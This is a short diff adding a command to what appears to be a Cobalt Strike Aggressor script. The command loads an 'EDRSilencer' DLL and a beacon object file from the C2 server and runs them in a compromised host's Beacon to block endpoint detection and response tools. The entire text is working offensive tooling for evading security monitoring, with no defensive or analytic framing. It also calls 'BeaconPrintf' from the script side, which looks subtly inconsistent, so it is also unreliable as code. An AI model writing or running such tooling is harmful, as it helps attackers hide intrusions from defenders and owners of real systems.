@@ -1,0 +1,23 @@
+command "edr_block" {
+    local('$bid $dll_bytes $bof_args');
+    $bid = $1;
+
+    # Read the DLL file from the C2 server's disk
+    $dll_path = script_resource("EDRSilencer.dll");
+    $handle = openf($dll_path);
+    $dll_bytes = readb($handle, -1);
+    closef($handle);
+
+    # Read the BOF file
+    $bof_path = script_resource("block_edr.x64.o");
+    $handle = openf($bof_path);
+    $bof_bytes = readb($handle, -1);
+    closef($handle);
+    
+    # Pack the DLL bytes as an argument for the BOF
+    $bof_args = bof_pack($bid, "b", $dll_bytes);
+
+    # Execute the BOF in the Beacon
+    BeaconPrintf($bid, "[+] Executing EDRSilencer BOF...");
+    bof_execute($bid, $bof_bytes, $bof_args);
+}
